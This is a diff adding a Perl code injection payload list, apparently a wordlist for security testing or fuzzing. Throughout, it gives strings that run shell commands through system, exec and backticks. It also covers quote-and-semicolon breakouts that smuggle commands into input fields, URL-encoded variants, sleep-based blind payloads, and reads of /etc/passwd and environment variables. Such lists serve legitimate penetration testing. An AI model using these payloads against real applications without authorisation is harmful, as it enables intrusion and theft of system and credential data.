@@ -1,0 +1,67 @@
+# Perl Code Injection Payloads
+# Basic command execution
+system('id');
+`id`
+exec('id');
+print `id`;
+
+# With terminators
+'; system('id'); #
+"; system("id"); #
+'; `id`; #
+"; `id`; #
+'; exec('id'); #
+"; exec("id"); #
+'; print `id`; #
+"; print `id`; #
+
+# System information
+system('whoami');
+system('pwd');
+system('uname -a');
+system('cat /etc/passwd');
+
+# Perl-specific
+print $^O;
+print $];
+print $^V;
+system('perl -v');
+
+# With different separators
+| system('id');
+& system('id');
+&& system('id');
+|| system('id');
+
+# URL encoded
+%73%79%73%74%65%6d%28%27%69%64%27%29%3b
+%60%69%64%60
+
+# Time-based payloads
+sleep(5);
+`sleep 5`
+system('sleep 5');
+exec('sleep 5');
+eval{sleep(5)};
+
+# Break out of contexts
+'); system('id'); #
+"); system("id"); #
+') or system('id'); #
+") or system("id"); #
+'; die system('id'); #
+"; die system("id"); #
+
+# Print environment
+system('env');
+system('set');
+print %ENV;
+
+# File operations
+system('ls -la');
+system('cat /etc/hosts');
+open(F, "/etc/passwd"); print <F>; close(F);
+
+# Network operations
+system('netstat -an');
+system('ps aux');
